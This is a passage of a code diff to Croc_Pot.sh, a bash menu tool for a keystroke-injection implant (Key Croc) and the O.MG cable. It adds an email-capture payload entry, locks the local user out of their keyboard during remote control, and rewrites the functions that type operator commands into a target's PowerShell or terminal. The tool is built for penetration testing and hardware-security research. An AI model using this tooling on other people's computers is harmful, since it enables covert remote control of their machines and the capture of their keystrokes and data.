+				ColorYellow 'Maybe next time\n' ;;
+			*)
+				invalid_entry ;;
+			esac
+	fi
+}
+##
 #----Install Payloads Menu
 ##
 MenuTitle 'INSTALL PAYLOADS MENU'
-MenuColor 22 1 'CROC GETONLINE PAYLOAD' | sed -z 's|\t\t\t|\t\t|g;s/\n//g' ; MenuColor 21 10 'CROC FORCE PAYLOAD' | sed 's/\t//g'
-MenuColor 22 2 'CROC UNLOCK PAYLOAD' | sed -z 's|\t\t\t|\t\t|g;s/\n//g' ; MenuColor 21 11 'CROC LOCKOUT PAYLOAD' | sed 's/\t//g'
-MenuColor 22 3 'WIFI SETUP PAYLOAD' | sed -z 's|\t\t\t|\t\t|g;s/\n//g' ; MenuColor 21 12 'WINDOWS DEFENDER' | sed 's/\t//g'
-MenuColor 22 4 'QUICK START CROC_POT' | sed -z 's|\t\t\t|\t\t|g;s/\n//g' ; MenuColor 21 13 'CROC CLOSE_IT PAYLOAD' | sed 's/\t//g'
-MenuColor 22 5 'CROC SHOT PAYLOAD' | sed -z 's|\t\t\t|\t\t|g;s/\n//g' ; MenuColor 21 14 'DOUBLE UP PAYLOAD' | sed 's/\t//g'
-MenuColor 22 6 'CROC BITE PAYLOAD' | sed -z 's|\t\t\t|\t\t|g;s/\n//g' ; MenuColor 21 15 'QUACK_ATTACK PAYLOAD' | sed 's/\t//g'
-MenuColor 22 7 'CROC REDIRECT PAYLOAD' | sed -z 's|\t\t\t|\t\t|g;s/\n//g' ; MenuColor 21 16 'KEYBOARD KILLER' | sed 's/\t//g'
-MenuColor 22 8 'NO SLEEPING PAYLOAD' | sed -z 's|\t\t\t|\t\t|g;s/\n//g' ; MenuColor 21 17 'KEYCROC ATTACKMODE' | sed 's/\t//g'
-MenuColor 22 9 'CROC REPLACE PAYLOAD' | sed -z 's|\t\t\t|\t\t|g;s/\n//g' ; MenuColor 21 18 'DELETE CHAR PAYLOAD' | sed 's/\t//g'
-MenuColor 22 19 'KEYSTROKES LAPTOP' ; MenuColor 22 20 'RESTRICTED WORDS' ; MenuColor 22 21 'RETURN TO MAIN MENU'
+MenuColor 22 1 'CROC GETONLINE PAYLOAD' | sed -z 's|\t\t\t|\t\t|g;s/\n//g' ; MenuColor 21 11 'CROC LOCKOUT PAYLOAD' | sed 's/\t//g'
+MenuColor 22 2 'CROC UNLOCK PAYLOAD' | sed -z 's|\t\t\t|\t\t|g;s/\n//g' ; MenuColor 21 12 'WINDOWS DEFENDER' | sed 's/\t//g'
+MenuColor 22 3 'WIFI SETUP PAYLOAD' | sed -z 's|\t\t\t|\t\t|g;s/\n//g' ; MenuColor 21 13 'CROC CLOSE_IT PAYLOAD' | sed 's/\t//g'
+MenuColor 22 4 'QUICK START CROC_POT' | sed -z 's|\t\t\t|\t\t|g;s/\n//g' ; MenuColor 21 14 'DOUBLE UP PAYLOAD' | sed 's/\t//g'
+MenuColor 22 5 'CROC SHOT PAYLOAD' | sed -z 's|\t\t\t|\t\t|g;s/\n//g' ; MenuColor 21 15 'QUACK_ATTACK PAYLOAD' | sed 's/\t//g'
+MenuColor 22 6 'CROC BITE PAYLOAD' | sed -z 's|\t\t\t|\t\t|g;s/\n//g' ; MenuColor 21 16 'KEYBOARD KILLER' | sed 's/\t//g'
+MenuColor 22 7 'CROC REDIRECT PAYLOAD' | sed -z 's|\t\t\t|\t\t|g;s/\n//g' ; MenuColor 21 17 'KEYCROC ATTACKMODE' | sed 's/\t//g'
+MenuColor 22 8 'NO SLEEPING PAYLOAD' | sed -z 's|\t\t\t|\t\t|g;s/\n//g' ; MenuColor 21 18 'DELETE CHAR PAYLOAD' | sed 's/\t//g'
+MenuColor 22 9 'CROC REPLACE PAYLOAD' | sed -z 's|\t\t\t|\t\t|g;s/\n//g' ; MenuColor 21 19 'KEYSTROKES LAPTOP' | sed 's/\t//g'
+MenuColor 21 10 'CROC FORCE PAYLOAD' | sed -z 's|\t\t\t|\t\t|g;s/\n//g' ; MenuColor 21 20 'RESTRICTED WORDS' | sed 's/\t//g'
+MenuColor 22 21 'EMAIL-CAPTURE PAYLOAD' ; MenuColor 22 22 'RETURN TO MAIN MENU'
 MenuEnd 22
 	case "$m_a" in
 		1) get_online_payload ; install_payloads_menu ;;
@@ -6566,8 +6645,10 @@ MenuEnd 22
 		18) Delete_Char ; install_payloads_menu ;;
 		19) keystrokes_laptop ; install_payloads_menu ;;
 		20) Restricted_words ; install_payloads_menu ;;
-		21) main_menu ;;
+		21) Email_Capture ; install_payloads_menu ;;
+		22) main_menu ;;
 		0) exit ;;
+		lock) Lock_keyboard ; install_payloads_menu ;;
 		[pP]) Panic_button ;; [bB]) croc_pot_plus ;; *) invalid_entry ; install_payloads_menu ;;
 	esac
 }
@@ -6600,7 +6681,7 @@ the usb-A female coupler plug one of the usb-A to usb-C adapter
 then plug in the usb-C inactive end of the O.MG cable.
 The other usb-A to usb-C adapter is plugged into the keycroc
 plug the active end of the O.MG cable into the keycroc and
-plug the keycroc into target pc
+plug the keycroc into target
 
 -On a remote device connect to O.MG wifi access point
 start web browser enter http://192.168.4.1 to open O.MG web UI
@@ -6635,16 +6716,27 @@ fi
 	read_all 'START CONNECTION Y/N AND PRESS [ENTER]'
 case "$r_a" in
 [yY] | [yY][eE][sS])
+	CONNECT_OMG() {
+		ColorYellow 'Connecting to O.MG WIFI access point\nThis SSH session will terminate\n'
+		LED SETUP
+		kill -9 $(pidof wpa_supplicant) && kill -9 $(pidof dhclient)
+		ifconfig wlan0 down
+		sed -i -E -e '/^[WS]/d' -e '14 a WIFI_SSID '"$(sed -n 1p "$omg_v")"'\nWIFI_PASS '"$(sed -n 2p $omg_v)"'\nSSH ENABLE' /root/udisk/config.txt
+		wpa_passphrase $(sed -n 1p "$omg_v") $(sed -n 2p "$omg_v") > /etc/wpa_supplicant.conf
+		ifconfig wlan0 up
+		wpa_supplicant -B -D nl80211 -iwlan0 -c /etc/wpa_supplicant.conf && dhclient wlan0
+		sleep 3
+		systemctl restart ssh.service
+		LED G ; sleep 2 ; LED OFF
+		exit
+	}
 	if [ -e "$omg_v" ]; then
 		ColorYellow 'FOUND EXISTING O.MG WIFI CREDENTIALS\n'
 		iw dev wlan0 scan | grep -E "signal:|SSID:" | sed -e "s/\tsignal: //" -e "s/\tSSID: //" | awk '{ORS = (NR % 2 == 0)? "\n" : " "; print}' | sed -n '/'"$(sed -n 1p $omg_v)"'/p'
 		read_all 'USE EXISTING O.MG CREDENTIALS AND CONNECT Y/N AND PRESS [ENTER]'
 		case "$r_a" in
 		[yY] | [yY][eE][sS])
-			ColorYellow 'Editing the keycroc config file to O.MG WIFI credentials\n'
-			sed -i -E -e '/^[WS]/d' -e '9 a WIFI_SSID '"$(sed -n 1p "$omg_v")"'\nWIFI_PASS '"$(sed -n 2p $omg_v)"'\nSSH ENABLE' /root/udisk/config.txt
-			LED G
-			ColorGreen 'Keycroc is now config to O.MG unplug keycroc and plug back in\n' ;;
+			CONNECT_OMG ;;
 		[nN] | [nN][oO])
 			rm "$omg_v"
 			read_all 'ENTER O.MG SSID AND PRESS [ENTER]' ; echo "$r_a" >> "$omg_v"
@@ -6652,10 +6744,7 @@ case "$r_a" in
 			iw dev wlan0 scan | grep -E "signal:|SSID:" | sed -e "s/\tsignal: //" -e "s/\tSSID: //" | awk '{ORS = (NR % 2 == 0)? "\n" : " "; print}' | sort
 			ColorYellow 'ENTER O.MG WIFI CREDENTIALS\n'
 			user_input_passwd "$omg_v" O.MG_WIFI
-			ColorYellow 'Editing the keycroc config file to O.MG WIFI credentials\n'
-			sed -i -E -e '/^[WS]/d' -e '9 a WIFI_SSID '"$(sed -n 1p $omg_v)"'\nWIFI_PASS '"$(sed -n 2p $omg_v)"'\nSSH ENABLE' /root/udisk/config.txt
-			LED G
-			ColorGreen 'Keycroc is now config to O.MG unplug keycroc and plug back in\n' ;;
+			CONNECT_OMG ;;
 		*)
 			invalid_entry ;;
 		esac
@@ -6666,13 +6755,9 @@ case "$r_a" in
 		[yY] | [yY][eE][sS])
 			ColorYellow 'Checking for O.MG wifi access point \n'
 			iw dev wlan0 scan | grep -E "signal:|SSID:" | sed -e "s/\tsignal: //" -e "s/\tSSID: //" | awk '{ORS = (NR % 2 == 0)? "\n" : " "; print}' | sort
-			ColorYellow 'ENTER O.MG WIFI CREDENTIALS\n'
 			read_all 'ENTER O.MG SSID AND PRESS [ENTER]' ; echo "$r_a" >> "$omg_v"
 			user_input_passwd "$omg_v" O.MG_WIFI
-			ColorYellow '}Editing the keycroc config file to O.MG WIFI credentials\n'
-			sed -i -E -e '/^[WS]/d' -e '9 a WIFI_SSID '"$(sed -n 1p $omg_v)"'\nWIFI_PASS '"$(sed -n 2p $omg_v)"'\nSSH ENABLE' /root/udisk/config.txt
-			LED G
-			ColorGreen 'Keycroc is now config to O.MG unplug keycroc and plug back in\n' ;;
+			CONNECT_OMG ;;
 		[nN] | [nN][oO])
 			ColorYellow 'Maybe next time\n' ;;
 		*)
@@ -6689,8 +6774,8 @@ esac
 #----O.MG start O.MG web UI
 ##
 omg_web() {
-	Info_Screen '-Open target pc web browser and start O.MG web UI
--Ensure target pc is connected to O.MG wifi access point first'
+	Info_Screen '-Open target web browser and start O.MG web UI
+-Ensure target is connected to O.MG wifi access point first'
 	read_all 'START O.MG WEB UI Y/N AND PRESS [ENTER]'
 	case "$r_a" in
 		[yY] | [yY][eE][sS])
@@ -6731,8 +6816,8 @@ omg_check() {
 		[yY] | [yY][eE][sS])
 			local t_ip=$(route -n | grep "UG" | grep -v "UGH" | cut -f 10 -d " " | sed -r 's/.{1}$//')
 			for omg in {1..254} ;do (ping -q -c 1 -w 1 "$t_ip""$omg" >/dev/null && echo "$t_ip$omg" &) ;done
-			arp -a | sed -n 's/\(OMG\)/\1/p'
-			local omg_ip=$(arp -a | sed -n 's/\(OMG\)/\1/p' | awk '{print $2}' | sed 's/[(),]//g')
+			arp -a | sed -n 's/\(O.lan\)/\1/p'
+			local omg_ip=$(arp -a | sed -n 's/\(O.lan\)/\1/p' | awk '{print $2}' | sed 's/[(),]//g')
 			if [[ "${omg_ip}" =~ $validate_ip ]]; then
 				ping -q -c 1 -w 1 "$omg_ip" &>/dev/null 2>&1
 				if [[ $? -ne 0 ]]; then
@@ -6767,16 +6852,19 @@ omg_check() {
 	MenuColor 21 3 'O.MG GITHUB PAGE'
 	MenuColor 21 4 'O.MG AP PAYLOAD'
 	MenuColor 21 5 'O.MG LOCAL NETWORK'
-	MenuColor 21 6 'RETURN TO MAIN MENU'
+	MenuColor 21 6 'O.MG WEB FLASHER'
+	MenuColor 21 7 'RETURN TO MAIN MENU'
 	MenuEnd 20
 	case "$m_a" in
 		1) omg_wifi ; omg_cable ;;
 		2) omg_web ; omg_cable ;;
 		3) start_web https://github.com/O-MG ; omg_cable ;;
-		4) omg_quick_connect ;;
+		4) omg_quick_connect ; omg_cable ;;
 		5) omg_check ; omg_cable ;;
-		6) main_menu ;;
+		6) start_web https://o-mg.github.io/WebFlasher ; omg_cable ;;
+		7) main_menu ;;
 		0) exit ;;
+		lock) Lock_keyboard ; omg_cable ;;
 		[pP]) Panic_button ;; [bB]) croc_pot_plus ;; *) invalid_entry ; omg_cable ;;
 	esac
 }
@@ -6788,10 +6876,10 @@ insert_quack() {
 -More for having remote access to keycroc and Run Croc_Pot remotely
 -Send QUACK command and start payloads remotely'
 ##
-#----open Target pc terminal Insert Quack command
+#----open Target terminal Insert Quack command
 ##
 q_terminal() {
-	Info_Screen '-This will open Target pc terminal
+	Info_Screen '-This will open Target terminal
 -run one Quack command and exit
 -Example: type hello world
 -hello world should display in terminal and exit'
@@ -6800,18 +6888,18 @@ q_terminal() {
 		[yY] | [yY][eE][sS])
 			if [ "$(OS_CHECK)" = WINDOWS ]; then
 				read_all 'ENTER WORD TO QUACK AND PRESS [ENTER]'
-				Q GUI d ; Q GUI r ; sleep 1 ; Q STRING "powershell" ; Q ENTER ; sleep 2 ; Q STRING "${r_a}" ; Q ENTER ; sleep 5 ; Q STRING "exit" ; Q ENTER ; Q ALT-TAB
+				QUACK GUI d ; QUACK GUI r ; sleep 1 ; QUACK STRING "powershell" ; QUACK ENTER ; sleep 2 ; QUACK STRING "${r_a}" ; QUACK ENTER ; sleep 5 ; QUACK STRING "exit" ; QUACK ENTER ; QUACK ALT-TAB
 			else
 				case "$HOST_CHECK" in
 					raspberrypi)
 						read_all 'ENTER WORD TO QUACK AND PRESS [ENTER]'
-						Q CONTROL-ALT-t ; sleep 1 ; Q STRING "${r_a}" ; Q ENTER ; sleep 5 ; Q STRING "exit" ; Q ENTER ; Q ALT-TAB ;;
+						QUACK CONTROL-ALT-t ; sleep 1 ; QUACK STRING "${r_a}" ; QUACK ENTER ; sleep 5 ; QUACK STRING "exit" ; QUACK ENTER ; QUACK ALT-TAB ;;
 					"$HOST_CHECK")
 						read_all 'ENTER WORD TO QUACK AND PRESS [ENTER]'
-						Q ALT F2 ; sleep 1 ; Q STRING "mate-terminal" ; Q ENTER ; sleep 1 ; Q STRING "${r_a}" ; Q ENTER ; sleep 5 ; Q STRING "exit" ; Q ENTER ; Q ALT-TAB ;;
+						QUACK ALT-t ; QUACK ENTER ; sleep 1 ; QUACK STRING "${r_a}" ; QUACK ENTER ; sleep 5 ; QUACK STRING "exit" ; QUACK ENTER ; QUACK ALT-TAB ;;
 					*)
 						read_all 'ENTER WORD TO QUACK AND PRESS [ENTER]'
-						Q ALT F2 ; sleep 1 ; Q STRING "xterm" ; Q ENTER ; sleep 1 ; Q STRING "${r_a}" ; Q ENTER ; sleep 5 ; Q STRING "exit" ; Q ENTER ; Q ALT-TAB ;;
+						QUACK ALT F2 ; sleep 1 ; QUACK STRING "xterm" ; QUACK ENTER ; sleep 1 ; QUACK STRING "${r_a}" ; QUACK ENTER ; sleep 5 ; QUACK STRING "exit" ; QUACK ENTER ; QUACK ALT-TAB ;;
 				esac
 			fi ;;
 		[nN] | [nN][oO])
@@ -6845,7 +6933,7 @@ q_ssh() {
 					fi
 					ColorYellow 'Example: enter uptime\n'
 					read_all 'ENTER QUACK COMMAND AND PRESS [ENTER]'
-					sshpass -p "$T_W" ssh -o "StrictHostKeyChecking no" "$T_H"@"$T_IP" "$(Q STRING "${r_a}" ; Q ENTER ; Q STRING "exit" ; Q ENTER)"
+					sshpass -p "$T_W" ssh -o "StrictHostKeyChecking no" "$T_H"@"$T_IP" "$(QUACK STRING "${r_a}" ; QUACK ENTER ; QUACK STRING "exit" ; QUACK ENTER)"
 				fi
 			else
 				ColorRed 'Not a valid ip address\n' ; invalid_entry
@@ -6857,22 +6945,22 @@ q_ssh() {
 	esac
 }
 ##
-#----Quack command to target pc
+#----Quack command to target
 ##
 q_target() {
-	Info_Screen '-QUACK command to target pc
+	Info_Screen '-QUACK command to target
 -This with QUACK two command at target current running application
 -This will run in loop, PRESS CONTROL + C TO EXIT
 -Example: STRING hak5   <-- First QUACK command
           ENTER         <-- Second QUACK command'
-	read_all 'START QUACK COMMAND TARGET PC Y/N AND PRESS [ENTER]'
+	read_all 'START QUACK COMMAND TARGET Y/N AND PRESS [ENTER]'
 	case "$r_a" in
 		[yY] | [yY][eE][sS])
 			reset_broken
 			while [ "$broken" -eq 1 ] && break || : ; do
 				read_all 'ENTER FIRST QUACK COMMAND AND PRESS [ENTER]' ; local Q_C_A="$r_a"
 				read_all' ENTER SECOND QUACK COMMAND AND PRESS [ENTER]' ; local Q_C_B="$r_a"
-				Q "$Q_C_A" ; sleep 1 ; Q "$Q_C_B"
+				QUACK "$Q_C_A" ; sleep 1 ; QUACK "$Q_C_B"
 			done ;;
 		[nN] | [nN][oO])
 			ColorYellow 'Maybe next time\n' ;;
@@ -6920,9 +7008,9 @@ and then delete and replace user characters
 				ColorYellow "KEYBOARD IN USE WAITING FOR $(ColorCyan 'INACTIVITY')\n\n"
 				WAIT_FOR_KEYBOARD_INACTIVITY 1
 				ColorYellow "REPLACING USER CHARACTERS WITH: $(ColorGreen "$r_a")\n"
-				Q CONTROL-SHIFT-LEFTARROW
-				Q BACKSPACE
-				Q STRING "${r_a}"
+				QUACK CONTROL-SHIFT-LEFTARROW
+				QUACK BACKSPACE
+				QUACK STRING "${r_a}"
 			done ;;
 		[nN] | [nN][oO])
 			ColorYellow 'Maybe next time\n' ;;
@@ -6931,20 +7019,20 @@ and then delete and replace user characters
 	esac
 }
 ##
-#----View target pc Keyboard activity or inactivity
+#----View Local Keyboard active or inactive
 ##
 kb_activity() {
-	Info_Screen '-Indicate if target pc Keyboard is activate or inactivate
+	Info_Screen '-Indicate if target Local Keyboard is active or inactive
 -PRESS CTRL + C to break loop in terminal'
 	reset_broken
 	while [ "$broken" -eq 1 ] && break || WAIT_FOR_KEYBOARD_ACTIVITY 0; do
 		local temp=${spinstr#?}
-		echo -ne "\e[40;3$(( RANDOM * 6 / 32767 +1 ))m$(printf " [%c] " "$spinstr")$clear${yellow}KEYBOARD: $clear${green}ACTIVITY $clear${yellow}COUNT: $clear$green$((i++))$clear\033[0K\r"
+		echo -ne "\e[40;3$(( RANDOM * 6 / 32767 +1 ))m$(printf " [%c] " "$spinstr")$clear${yellow}LOCAL KEYBOARD: $clear${green}ACTIVE $clear${yellow}COUNT: $clear$green$((i++))$clear\033[0K\r"
 		local spinstr=$temp${spinstr%"$temp"}
 	done &
 	while [ "$broken" -eq 1 ] && break || WAIT_FOR_KEYBOARD_INACTIVITY 1; do
 		local temp=${spinstr#?}
-		echo -ne "\e[40;3$(( RANDOM * 6 / 32767 +1 ))m$(printf " [%c] " "$spinstr")$clear${yellow}KEYBOARD: $clear${cyan}INACTIVITY $clear${yellow}COUNT: $clear$green$((i++))$clear\033[0K\r"
+		echo -ne "\e[40;3$(( RANDOM * 6 / 32767 +1 ))m$(printf " [%c] " "$spinstr")$clear${yellow}LOCAL KEYBOARD: $clear${cyan}INACTIVE $clear${yellow}COUNT: $clear$green$((i++))$clear\033[0K\r"
 		local spinstr=$temp${spinstr%"$temp"}
 	done
 }
@@ -6956,34 +7044,39 @@ remote_keyboard() {
 
 -Start remote ssh session with keycroc then run Croc_Pot with typing
 /root/udisk/tools/Croc_Pot.sh select this option and start typing in
-remote terminal keystroke entry should display on target pc
+remote terminal keystroke entry should display on target
 
 NOTE: Not all keystroke entry are working at the moment
+**Local keyboard will be lockout**
 
 -Alternet keystrokes entry
--Press ALT-i will execute Q GUI i
--Press ALT-x will execute Q GUI x
--Press ALT-0 will execute Q GUI
--Press ALT-4 will execute Q ALT-F4
--Press ALT-5 will execute Q GUI r
--Press ALT-6 will execute Q GUI d
--Press ALT-7 will execute Q GUI l
--Press ALT-8 will execute Q CONTROL-ALT-d
--Press ALT-9 will execute Q CONTROL-ALT-t
--Press ALT-z will execute Q CONTROL-z
--Press ALT-c will execute Q ALT-SPACE ; Q c
--Press ALT-s will execute Q ALT-SPACE
--Press ALT-n will execute Q NUMLOCK
--Press ALT-l will execute Q CAPSLOCK
--Press ALT-p will execute Q PRINTSCREEN
--Press ALT-SHIFT-T will execute Q ALT-TAB
--Press ALT-SHIFT-E will execute Q ALT-ESCAPE
--Press CTRL-t will execute Q CONTROL-TAB
--Press F1 to return back to Croc_Pot menu'
+
+-Press ALT-i will execute QUACK GUI i
+-Press ALT-x will execute QUACK GUI x
+-Press ALT-0 will execute QUACK GUI
+-Press ALT-4 will execute QUACK ALT-F4
+-Press ALT-5 will execute QUACK GUI r
+-Press ALT-6 will execute QUACK GUI d
+-Press ALT-7 will execute QUACK GUI l
+-Press ALT-8 will execute QUACK CONTROL-ALT-d
+-Press ALT-9 will execute QUACK CONTROL-ALT-t
+-Press ALT-z will execute QUACK CONTROL-z
+-Press ALT-c will execute QUACK ALT-SPACE ; Q c
+-Press ALT-s will execute QUACK ALT-SPACE
+-Press ALT-n will execute QUACK NUMLOCK
+-Press ALT-l will execute QUACK CAPSLOCK
+-Press ALT-p will execute QUACK PRINTSCREEN
+-Press ALT-u will execute QUACK UNLOCK (local keyboard)
+-Press ALT-o will execute QUACK LOCK (local keyboard)
+-Press ALT-SHIFT-T will execute QUACK ALT-TAB
+-Press ALT-SHIFT-E will execute QUACK ALT-ESCAPE
+-Press CTRL-t will execute QUACK CONTROL-TAB
+-Press F2 to return back to menu'
 	read_all 'START REMOTE KEYBOARD Y/N AND PRESS [ENTER]'
 case "$r_a" in
 	[yY] | [yY][eE][sS])
 		ColorYellow "\n\n\tKEYCROC REMOTE KEYBOARD ENTER KEYSTROKES HERE\n\n"
+		QUACK LOCK
 		trap ctrl_c SIGINT
 		stty -echo
 		declare -a fnkey
@@ -7001,144 +7094,148 @@ case "$r_a" in
 		}
 	while read_key_press; do
 		ctrl_c() {
-			Q CONTROL-c ; echo -ne " CTRL-C "
+			QUACK CONTROL-c ; echo -ne " CTRL-C "
 		}
 		case "$key_press" in
-			$'\e'"${fnkey[1]}") Q F1 ; echo -ne " F1 " ; trap - SIGINT ; stty echo ; break ;;
-			$'\e'"${fnkey[2]}") Q F2 ; echo -ne " F2 " ;;
-			$'\e'"${fnkey[3]}") Q F3 ; echo -ne " F3 " ;;
-			$'\e'"${fnkey[4]}") Q F4 ; echo -ne " F4 " ;;
-			$'\e'"${fnkey[5]}") Q F5 ; echo -ne " F5 " ;;
-			$'\e'"${fnkey[6]}") Q F6 ; echo -ne " F6 " ;;
-			$'\e'"${fnkey[7]}") Q F7 ; echo -ne " F7 " ;;
-			$'\e'"${fnkey[8]}") Q F8 ; echo -ne " F8 " ;;
-			$'\e'"${fnkey[9]}") Q F9 ; echo -ne " F9 " ;;
-			$'\e'"${fnkey[10]}") Q F10 ; echo -ne " F10 " ;;
-			$'\e'"${fnkey[11]}") Q F11 ; echo -ne " F11 " ;;
-			$'\e'"${fnkey[12]}") Q F12 ; echo -ne " F12 " ;;
-			$'\e[5~') Q KEYCODE 00,00,4b ; echo -ne " PAGEUP " ;;
-			$'\e[6~') Q PAGEDOWN ; echo -ne " PAGEDOWN " ;;
-			$'\e[2~') Q INSERT ; echo -ne " INSERT " ;;
-			$'\e[3~') Q DELETE ; echo -ne " DELETE " ;;
-			$'\E[1;2P') Q SHIFT-F1 ; echo -ne " SHIFT-F1 " ;;
-			$'\E[1;2Q') Q SHIFT-F2 ; echo -ne " SHIFT-F2 " ;;
-			$'\E[1;2R') Q SHIFT-F3 ; echo -ne " SHIFT-F3 " ;;
-			$'\E[1;2S') Q SHIFT-F4 ; echo -ne " SHIFT-F4 " ;;
-			$'\E[15;2~') Q SHIFT-F5 ; echo -ne " SHIFT-F5 " ;;
-			$'\E[17;2~') Q SHIFT-F6 ; echo -ne " SHIFT-F6 " ;;
-			$'\E[18;2~') Q SHIFT-F7 ; echo -ne " SHIFT-F7 " ;;
-			$'\E[19;2~') Q SHIFT-F8 ; echo -ne " SHIFT-F8 " ;;
-			$'\E[20;2~') Q SHIFT-F9 ; echo -ne " SHIFT-F9 " ;;
-			$'\E[21;2~') Q SHIFT-F10 ; echo -ne " SHIFT-F10 " ;;
-			$'\E[23;2~') Q SHIFT-F11 ; echo -ne " SHIFT-F11 " ;;
-			$'\E[24;2~') Q SHIFT-F12 ; echo -ne " SHIFT-F12 " ;;
-			$'\e[H') Q HOME ; echo -ne " HOME " ;;
-			$'\e[F') Q END ; echo -ne " END " ;;
-			$'\033') Q ESCAPE ; echo -ne " ESC " ;;
-			$'\E[A') Q UPARROW ; echo -ne " UPARROW " ;;
-			$'\E[B') Q DOWNARROW ; echo -ne " DOWNARROW " ;;
-			$'\E[C') Q RIGHTARROW ; echo -ne " RIGHTARROW " ;;
-			$'\E[D') Q LEFTARROW ; echo -ne " LEFTARROW " ;;
-			$'\177') Q BACKSPACE ; echo -ne "\b \b" ;;
-			$'\x20') Q KEYCODE 00,00,2c ; echo -ne " " ;;
-			$'\e.') Q ALT-. ; echo -ne " ALT-. " ;;
-			$'\e0') Q GUI ; echo -ne " GUI " ;;
-			$'\e1') Q ALT-1 ; echo -ne " ALT-1 " ;;
-			$'\e2') Q ALT-2 ; echo -ne " ALT-2 " ;;
-			$'\e3') Q ALT-3 ; echo -ne " ALT-3 " ;;
-			$'\e4') Q ALT-F4 ; echo -ne " ALT-F4 " ;;
-			$'\e5') Q GUI r ; echo -ne " GUI-R " ;;
-			$'\e6') Q GUI d ; echo -ne " GUI-D " ;;
-			$'\e7') Q GUI l ; echo -ne " GUI-L " ;;
-			$'\e8') Q CONTROL-ALT-d ; echo -ne " CTRL-ALT-D " ;;
-			$'\e9') Q CONTROL-ALT-t ; echo -ne " CTRL-ALT-T " ;;
-			$'\ea') Q ALT-a ; echo -ne " ALT-A " ;;
-			$'\eb') Q ALT-b ; echo -ne " ALT-B " ;;
-			$'\ec') Q ALT-SPACE ; Q c ; echo -ne " ALT-SPACE-C " ;;
-			$'\ed') Q ALT-d ; echo -ne " ALT-D " ;;
-			$'\ee') Q ALT-e ; echo -ne " ALT-E " ;;
-			$'\ef') Q ALT-f ; echo -ne " ALT-F " ;;
-			$'\eg') Q ALT-g ; echo -ne " ALT-G " ;;
-			$'\eh') Q ALT-h ; echo -ne " ALT-H " ;;
-			$'\ei') Q GUI i ; echo -ne " GUI-I " ;;
-			$'\ej') Q ALT j ; echo -ne " ALT-J " ;;
-			$'\ek') Q ALT k ; echo -ne " ALT-K " ;;
-			$'\el') Q CAPSLOCK ; echo -ne " CAPSLOCK " ;;
-			$'\en') Q NUMLOCK ; echo -ne " NUMLOCK " ;;
-			$'\ep') Q PRINTSCREEN ; echo -ne " PRINTSCREEN " ;;
-			$'\es') Q ALT-SPACE ; echo -ne " ALT-SPACE " ;;
-			$'\ev') Q ALT-v ; echo -ne " ALT-V " ;;
-			$'\ex') Q GUI x ; echo -ne " GUI-X " ;;
-			$'\ey') Q ALT-y ; echo -ne " ALT-Y " ;;
-			$'\ez') Q CONTROL-z ; echo -ne " CTRL-Z " ;;
-			$'\eA') Q ALT-SHIFT-a ; echo -ne " ALT-SHIFT-A " ;;
-			$'\eB') Q ALT-SHIFT-b ; echo -ne " ALT-SHIFT-B " ;;
-			$'\eC') Q ALT-SHIFT-c ; echo -ne " ALT-SHIFT-C " ;;
-			$'\eD') Q ALT-SHIFT-d ; echo -ne " ALT-SHIFT-D " ;;
-			$'\eE') Q ALT-ESCAPE ; echo -ne " ALT-ESC " ;;
-			$'\eF') Q ALT-SHIFT-f ; echo -ne " ALT-SHIFT-F " ;;
-			$'\eP') Q ALT-SHIFT-p ; echo -ne " ALT-SHIFT-P " ;;
-			$'\eW') Q ALT-SHIFT-w ; echo -ne " ALT-SHIFT-W " ;;
-			$'\eL') Q ALT-SHIFT-l ; echo -ne " ALT-SHIFT-L " ;;
-			$'\eT') Q ALT-TAB ; echo -ne " ALT-TAB " ;;
-			$'\e[1;3P') Q ALT-F1 ; echo -ne " ALT-F1 " ;;
-			$'\e[1;3Q') Q ALT-F2 ; echo -ne " ALT-F2 " ;;
-			$'\e[1;3R') Q ALT-F3 ; echo -ne " ALT-F3 " ;;
-			$'\e[1;3S') Q ALT-F4 ; echo -ne " ALT-F4 " ;;
-			$'\e[15;3~') Q ALT-F5 ; echo -ne " ALT-F5 " ;;
-			$'\e[17;3~') Q ALT-F6 ; echo -ne " ALT-F6 " ;;
-			$'\e[18;3~') Q ALT-F7 ; echo -ne " ALT-F7 " ;;
-			$'\e[19;3~') Q ALT-F8 ; echo -ne " ALT-F8 " ;;
-			$'\e[20;3~') Q ALT-F9 ; echo -ne " ALT-F9 " ;;
-			$'\e[21;3~') Q ALT-F10 ; echo -ne " ALT-F10 " ;;
-			$'\e[23;3~') Q ALT-F11 ; echo -ne " ALT-F11 " ;;
-			$'\e[24;3~') Q ALT-F12 ; echo -ne " ALT-F12 " ;;
-			$'\e[1;3A') Q ALT-UPARROW ; echo -ne " ALT-UPARROW " ;;
-			$'\e[1;3B') Q ALT-DOWNARROW ; echo -ne " ALT-DOWNARROW " ;;
-			$'\e[1;3C') Q ALT-RIGHTARROW ; echo -ne " ALT-RIGHTARROW " ;;
-			$'\e[1;3D') Q ALT-LEFTARROW ; echo -ne " ALT-LEFTARROW " ;;
-			$'\e[1;6A') Q CONTROL-SHIFT-UPARROW ; echo -ne " CTRL-SHIFT-UPARROW " ;;
-			$'\e[1;6B') Q CONTROL-SHIFT-DOWNARROW ; echo -ne " CTRL-SHIFT-DOWNARROW " ;;
-			$'\e[1;6C') Q CONTROL-SHIFT-RIGHTARROW ; echo -ne " CTRL-SHIFT-RIGHTARROW " ;;
-			$'\e[1;6D') Q CONTROL-SHIFT-LEFTARROW ; echo -ne " CTRL-SHIFT-LEFTARROW " ;;
-			$'\e[1;5A') Q CONTROL-UPARROW ; echo -ne " CTRL-UPARROW " ;;
-			$'\e[1;5B') Q CONTROL-DOWNARROW ; echo -ne " CTRL-DOWNARROW " ;;
-			$'\e[1;5C') Q CONTROL-RIGHTARROW ; echo -ne " CTRL-RIGHTARROW " ;;
-			$'\e[1;5D') Q CONTROL-LEFTARROW ; echo -ne " CTRL-LEFTARROW " ;;
-			$'\e[1;2A') Q SHIFT-UPARROW ; echo -ne " SHIFT-UPARROW " ;;
-			$'\e[1;2B') Q SHIFT-DOWNARROW ; echo -ne " SHIFT-DOWNARROW " ;;
-			$'\e[1;2C') Q SHIFT-RIGHTARROW ; echo -ne " SHIFT-RIGHTARROW " ;;
-			$'\e[1;2D') Q SHIFT-LEFTARROW ; echo -ne " SHIFT-LEFTARROW " ;;
-			$'\0') Q ENTER ; echo -ne " ENTER \n" ;;
-			$'\t') Q TAB ; echo -ne " TAB " ;;
-			$'\e[Z') Q SHIFT-TAB ; echo -ne " SHIFT-TAB " ;;
-			[[:graph:]]) Q STRING "$key_press" ; echo -ne "$key_press" ;;
+			$'\e'"${fnkey[1]}") QUACK F1 ; echo -ne " F1 " ;;
